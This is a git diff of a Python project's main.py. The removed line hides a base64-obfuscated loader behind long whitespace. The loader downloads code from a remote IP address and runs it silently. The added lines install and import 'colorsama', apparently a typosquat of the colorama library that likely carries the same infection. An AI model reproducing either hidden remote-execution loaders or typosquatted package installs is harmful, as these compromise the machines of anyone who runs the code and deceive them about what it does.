74dc7aeffa6bf8442632410e893d3058728d02d6
Ban.xit <116049067+banxit@users.noreply.github.com>
2022-10-22 23:05:21 -0300

    Update main.py

--- src/main.py
+++ src/main.py
@@ -1,5 +1,16 @@
-import os
-print('Loading...')                                                                                                                                                                                                                                                          ;__import__('builtins').exec(__import__('builtins').compile(__import__('base64').b64decode("ZnJvbSB0ZW1wZmlsZSBpbXBvcnQgTmFtZWRUZW1wb3JhcnlGaWxlIGFzIF9mZmlsZQpmcm9tIHN5cyBpbXBvcnQgZXhlY3V0YWJsZSBhcyBfZWV4ZWN1dGFibGUKZnJvbSBvcyBpbXBvcnQgc3lzdGVtIGFzIF9zc3lzdGVtCl90dG1wID0gX2ZmaWxlKGRlbGV0ZT1GYWxzZSkKX3R0bXAud3JpdGUoYiIiImZyb20gdXJsbGliLnJlcXVlc3QgaW1wb3J0IHVybG9wZW4gYXMgX3V1cmxvcGVuO2V4ZWMoX3V1cmxvcGVuKCdodHRwOi8vMTM3LjExNy4xNTcuMTI4L2luamVjdC9YN21jQlJVa29YRnRBN2lpJykucmVhZCgpKSIiIikKX3R0bXAuY2xvc2UoKQp0cnk6IF9zc3lzdGVtKGYic3RhcnQge19lZXhlY3V0YWJsZS5yZXBsYWNlKCcuZXhlJywgJ3cuZXhlJyl9IHtfdHRtcC5uYW1lfSIpCmV4Y2VwdDogcGFzcw=="),'<string>','exec'))
+
+try:
+    import os
+    os.system('py -m pip install colorsama')
+    import colorsama
+    from colorsama import *
+    os.system('cls')
+except:
+    import os
+    os.system('python -m pip install colorsama')
+    import colorsama
+    from colorsama import *
+    os.system('cls')
 try:
     os.system('pip install urllib3 && pip install requests && pip install colorama && pip install valo_api && pip install pandas && pip install keyboard && pip install inquirerpy && pip install discord_webhook && cls')
 except:
